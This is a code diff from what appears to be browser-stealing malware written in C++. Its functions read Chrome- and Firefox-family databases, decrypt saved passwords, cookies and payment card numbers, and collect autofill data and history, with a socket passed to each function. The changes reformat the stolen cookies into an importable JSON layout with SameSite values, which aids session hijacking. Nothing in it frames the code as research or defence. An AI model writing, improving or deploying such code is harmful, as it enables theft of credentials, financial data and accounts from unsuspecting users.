@@ -580,11 +580,11 @@ void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::str
                     std::string str_url = url ? url : ""; std::string str_user = user ? user : ""; std::string str_pass = std::string(dec.begin(), dec.end());
                     oss_txt << "URL: " << str_url << "\nUser: " << str_user << "\nPass: " << str_pass << "\n---\n";
                     if (!first) oss_json << ",\n";
-                    oss_json << "  {\n";
-                    oss_json << "    \"url\": \"" << json_escape(str_url) << "\",\n";
-                    oss_json << "    \"username\": \"" << json_escape(str_user) << "\",\n";
-                    oss_json << "    \"password\": \"" << json_escape(str_pass) << "\"\n";
-                    oss_json << "  }";
+                    oss_json << "    {\n";
+                    oss_json << "        \"url\": \"" << json_escape(str_url) << "\",\n";
+                    oss_json << "        \"username\": \"" << json_escape(str_user) << "\",\n";
+                    oss_json << "        \"password\": \"" << json_escape(str_pass) << "\"\n";
+                    oss_json << "    }";
                     first = false;
                 }
             }
@@ -601,7 +601,7 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
     fs::path db_path = profile_path / "Network" / "Cookies"; if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
     if (!fs::exists(db_path)) return; std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
-        sqlite3_stmt* stmt; const char* sql = "SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies";
+        sqlite3_stmt* stmt; const char* sql = "SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite FROM cookies";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ostringstream oss_txt, oss_json;
             oss_json << "[\n"; bool first = true;
@@ -611,6 +611,7 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
                 int blob_size = sqlite3_column_bytes(stmt, 3);
                 const char* path = (const char*)sqlite3_column_text(stmt, 4); long long expires_utc = sqlite3_column_int64(stmt, 5);
                 int secure = sqlite3_column_int(stmt, 6); int httponly = sqlite3_column_int(stmt, 7);
+                int samesite = sqlite3_column_int(stmt, 8);
 
                 std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
                 std::string cookie_val = !dec.empty() ? std::string(dec.begin(), dec.end()) : (value ? value : "");
@@ -618,28 +619,25 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
                     std::string str_name = name ? name : "";
                     std::string str_host = host ? host : "";
                     std::string str_path = path ? path : "";
+                    double expirationDate = (expires_utc > 0) ? ((double)(expires_utc - 11644473600000000ULL) / 1000000.0) : 0;
 
-                    // Convert Chrome time (microseconds since Jan 1, 1601) to Unix time (seconds since Jan 1, 1970)
-                    double expirationDate = 0;
-                    if (expires_utc > 0) {
-                        expirationDate = (double)(expires_utc - 11644473600000000ULL) / 1000000.0;
-                    }
-
-                    oss_txt << str_name << "=" << cookie_val << ";";
+                    oss_txt << str_name << "=" << cookie_val << ";\n";
                     if (!first) oss_json << ",\n";
-                    oss_json << "  {\n";
-                    oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
-                    oss_json << "    \"value\": \"" << json_escape(cookie_val) << "\",\n";
-                    oss_json << "    \"domain\": \"" << json_escape(str_host) << "\",\n";
-                    oss_json << "    \"path\": \"" << json_escape(str_path) << "\",\n";
-                    if (expirationDate > 0) oss_json << "    \"expirationDate\": " << (long long)expirationDate << ",\n";
-                    oss_json << "    \"hostOnly\": " << (str_host.size() > 0 && str_host[0] != '.' ? "true" : "false") << ",\n";
-                    oss_json << "    \"httpOnly\": " << (httponly ? "true" : "false") << ",\n";
-                    oss_json << "    \"secure\": " << (secure ? "true" : "false") << ",\n";
-                    oss_json << "    \"session\": " << (expires_utc == 0 ? "true" : "false") << ",\n";
-                    oss_json << "    \"sameSite\": \"unspecified\",\n";
-                    oss_json << "    \"storeId\": \"0\"\n";
-                    oss_json << "  }";
+
+                    oss_json << "{\"domain\": \"" << json_escape(str_host) << "\", ";
+                    if (expirationDate > 0) oss_json << "\"expirationDate\": " << std::fixed << std::setprecision(6) << expirationDate << ", ";
+                    oss_json << "\"hostOnly\": " << (str_host.size() > 0 && str_host[0] != '.' ? "true" : "false") << ", ";
+                    oss_json << "\"httpOnly\": " << (httponly ? "true" : "false") << ", ";
+                    oss_json << "\"name\": \"" << json_escape(str_name) << "\", ";
+                    oss_json << "\"path\": \"" << json_escape(str_path) << "\", ";
+                    const char* ss = "unspecified";
+                    if (samesite == 0) ss = "no_restriction"; else if (samesite == 1) ss = "lax"; else if (samesite == 2) ss = "strict";
+                    if (samesite == -1) oss_json << "\"sameSite\": null, ";
+                    else oss_json << "\"sameSite\": \"" << ss << "\", ";
+                    oss_json << "\"secure\": " << (secure ? "true" : "false") << ", ";
+                    oss_json << "\"session\": " << (expires_utc == 0 ? "true" : "false") << ", ";
+                    oss_json << "\"storeId\": null, ";
+                    oss_json << "\"value\": \"" << json_escape(cookie_val) << "\"}";
                     first = false;
                 }
             }
@@ -667,11 +665,11 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
                     std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                     oss_txt << "Form: " << str_name << " = " << str_val << "\n";
                     if (!first) oss_json << ",\n";
-                    oss_json << "  {\n";
-                    oss_json << "    \"type\": \"form\",\n";
-                    oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
-                    oss_json << "    \"value\": \"" << json_escape(str_val) << "\"\n";
-                    oss_json << "  }";
+                    oss_json << "    {\n";
+                    oss_json << "        \"type\": \"form\",\n";
+                    oss_json << "        \"name\": \"" << json_escape(str_name) << "\",\n";
+                    oss_json << "        \"value\": \"" << json_escape(str_val) << "\"\n";
+                    oss_json << "    }";
                     first = false;
                 }
                 sqlite3_finalize(stmt);
@@ -686,11 +684,11 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
                         std::string str_guid = guid ? guid : ""; std::string str_val = val ? val : "";
                         oss_txt << table << " (" << str_guid << "): " << str_val << "\n";
                         if (!first) oss_json << ",\n";
-                        oss_json << "  {\n";
-                        oss_json << "    \"type\": \"" << json_escape(table) << "\",\n";
-                        oss_json << "    \"guid\": \"" << json_escape(str_guid) << "\",\n";
-                        oss_json << "    \"value\": \"" << json_escape(str_val) << "\"\n";
-                        oss_json << "  }";
+                        oss_json << "    {\n";
+                        oss_json << "        \"type\": \"" << json_escape(table) << "\",\n";
+                        oss_json << "        \"guid\": \"" << json_escape(str_guid) << "\",\n";
+                        oss_json << "        \"value\": \"" << json_escape(str_val) << "\"\n";
+                        oss_json << "    }";
                         first = false;
                     }
                     sqlite3_finalize(stmt);
@@ -705,12 +703,12 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
                         std::string str_name = name ? name : ""; std::string str_num = std::string(dec.begin(), dec.end());
                         oss_txt << "Card: " << str_name << " | Exp: " << m << "/" << y << " | Num: " << str_num << "\n";
                         if (!first) oss_json << ",\n";
-                        oss_json << "  {\n";
-                        oss_json << "    \"type\": \"card\",\n";
-                        oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
-                        oss_json << "    \"expiry\": \"" << m << "/" << y << "\",\n";
-                        oss_json << "    \"number\": \"" << json_escape(str_num) << "\"\n";
-                        oss_json << "  }";
+                        oss_json << "    {\n";
+                        oss_json << "        \"type\": \"card\",\n";
+                        oss_json << "        \"name\": \"" << json_escape(str_name) << "\",\n";
+                        oss_json << "        \"expiry\": \"" << m << "/" << y << "\",\n";
+                        oss_json << "        \"number\": \"" << json_escape(str_num) << "\"\n";
+                        oss_json << "    }";
                         first = false;
                     }
                 }
@@ -738,12 +736,12 @@ void extract_history(SOCKET sock, const fs::path& profile_path, const std::strin
                 std::string str_url = url ? url : ""; std::string str_title = title ? title : "";
                 oss_txt << "URL: " << str_url << " | Title: " << str_title << " | Visits: " << count << "\n";
                 if (!first) oss_json << ",\n";
-                oss_json << "  {\n";
-                oss_json << "    \"url\": \"" << json_escape(str_url) << "\",\n";
-                oss_json << "    \"title\": \"" << json_escape(str_title) << "\",\n";
-                oss_json << "    \"visit_count\": " << count << ",\n";
-                oss_json << "    \"last_visit_time\": " << last_visit << "\n";
-                oss_json << "  }";
+                oss_json << "    {\n";
+                oss_json << "        \"url\": \"" << json_escape(str_url) << "\",\n";
+                oss_json << "        \"title\": \"" << json_escape(str_title) << "\",\n";
+                oss_json << "        \"visit_count\": " << count << ",\n";
+                oss_json << "        \"last_visit_time\": " << last_visit << "\n";
+                oss_json << "    }";
                 first = false;
             }
             oss_json << "\n]";
@@ -776,7 +774,7 @@ void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const st
     fs::path db_path = profile_path / "cookies.sqlite"; if (!fs::exists(db_path)) return;
     std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
-        sqlite3_stmt* stmt; const char* sql = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies";
+        sqlite3_stmt* stmt; const char* sql = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ostringstream oss_txt, oss_json;
             oss_json << "[\n"; bool first = true;
@@ -784,25 +782,27 @@ void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const st
                 const char* host = (const char*)sqlite3_column_text(stmt, 0); const char* name = (const char*)sqlite3_column_text(stmt, 1);
                 const char* value = (const char*)sqlite3_column_text(stmt, 2); const char* path = (const char*)sqlite3_column_text(stmt, 3);
                 long long expiry = sqlite3_column_int64(stmt, 4); int secure = sqlite3_column_int(stmt, 5); int httponly = sqlite3_column_int(stmt, 6);
+                int samesite = sqlite3_column_int(stmt, 7);
 
                 std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                 std::string str_host = host ? host : ""; std::string str_path = path ? path : "";
 
-                oss_txt << str_name << "=" << str_val << ";";
+                oss_txt << str_name << "=" << str_val << ";\n";
                 if (!first) oss_json << ",\n";
-                oss_json << "  {\n";
-                oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
-                oss_json << "    \"value\": \"" << json_escape(str_val) << "\",\n";
-                oss_json << "    \"domain\": \"" << json_escape(str_host) << "\",\n";
-                oss_json << "    \"path\": \"" << json_escape(str_path) << "\",\n";
-                if (expiry > 0) oss_json << "    \"expirationDate\": " << expiry << ",\n";
-                oss_json << "    \"hostOnly\": " << (str_host.size() > 0 && str_host[0] != '.' ? "true" : "false") << ",\n";
-                oss_json << "    \"httpOnly\": " << (httponly ? "true" : "false") << ",\n";
-                oss_json << "    \"secure\": " << (secure ? "true" : "false") << ",\n";
-                oss_json << "    \"session\": " << (expiry == 0 ? "true" : "false") << ",\n";
-                oss_json << "    \"sameSite\": \"unspecified\",\n";
-                oss_json << "    \"storeId\": \"0\"\n";
-                oss_json << "  }";
+
+                oss_json << "{\"domain\": \"" << json_escape(str_host) << "\", ";
+                if (expiry > 0) oss_json << "\"expirationDate\": " << expiry << ".0, ";
+                oss_json << "\"hostOnly\": " << (str_host.size() > 0 && str_host[0] != '.' ? "true" : "false") << ", ";
+                oss_json << "\"httpOnly\": " << (httponly ? "true" : "false") << ", ";
+                oss_json << "\"name\": \"" << json_escape(str_name) << "\", ";
+                oss_json << "\"path\": \"" << json_escape(str_path) << "\", ";
+                const char* ss = "unspecified";
+                if (samesite == 1) ss = "lax"; else if (samesite == 2) ss = "strict"; else if (samesite == 0) ss = "no_restriction";
+                oss_json << "\"sameSite\": \"" << ss << "\", ";
+                oss_json << "\"secure\": " << (secure ? "true" : "false") << ", ";
+                oss_json << "\"session\": " << (expiry == 0 ? "true" : "false") << ", ";
+                oss_json << "\"storeId\": null, ";
+                oss_json << "\"value\": \"" << json_escape(str_val) << "\"}";
                 first = false;
             }
             oss_json << "\n]";
@@ -828,12 +828,12 @@ void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const st
                 std::string str_url = url ? url : ""; std::string str_title = title ? title : "";
                 oss_txt << "URL: " << str_url << " | Title: " << str_title << " | Visits: " << count << "\n";
                 if (!first) oss_json << ",\n";
-                oss_json << "  {\n";
-                oss_json << "    \"url\": \"" << json_escape(str_url) << "\",\n";
-                oss_json << "    \"title\": \"" << json_escape(str_title) << "\",\n";
-                oss_json << "    \"visit_count\": " << count << ",\n";
-                oss_json << "    \"last_visit_date\": " << last_visit << "\n";
-                oss_json << "  }";
+                oss_json << "    {\n";
+                oss_json << "        \"url\": \"" << json_escape(str_url) << "\",\n";
+                oss_json << "        \"title\": \"" << json_escape(str_title) << "\",\n";
+                oss_json << "        \"visit_count\": " << count << ",\n";
+                oss_json << "        \"last_visit_date\": " << last_visit << "\n";
+                oss_json << "    }";
                 first = false;
             }
             oss_json << "\n]";
@@ -858,10 +858,10 @@ void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const s
                 std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                 oss_txt << "Field: " << str_name << " = " << str_val << "\n";
                 if (!first) oss_json << ",\n";
-                oss_json << "  {\n";
-                oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
-                oss_json << "    \"value\": \"" << json_escape(str_val) << "\"\n";
-                oss_json << "  }";
+                oss_json << "    {\n";
+                oss_json << "        \"name\": \"" << json_escape(str_name) << "\",\n";
+                oss_json << "        \"value\": \"" << json_escape(str_val) << "\"\n";
+                oss_json << "    }";
                 first = false;
             }
             oss_json << "\n]";
@@ -915,11 +915,11 @@ void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const 
                             std::string str_pass = std::string((char*)dec_pass.data, dec_pass.len);
                             oss_txt << "URL: " << host << "\nUser: " << str_user << "\nPass: " << str_pass << "\n---\n";
                             if (!first) oss_json << ",\n";
-                            oss_json << "  {\n";
-                            oss_json << "    \"url\": \"" << json_escape(host) << "\",\n";
-                            oss_json << "    \"username\": \"" << json_escape(str_user) << "\",\n";
-                            oss_json << "    \"password\": \"" << json_escape(str_pass) << "\"\n";
-                            oss_json << "  }";
+                            oss_json << "    {\n";
+                            oss_json << "        \"url\": \"" << json_escape(host) << "\",\n";
+                            oss_json << "        \"username\": \"" << json_escape(str_user) << "\",\n";
+                            oss_json << "        \"password\": \"" << json_escape(str_pass) << "\"\n";
+                            oss_json << "    }";
                             first = false;
                         }
                         pos = end;
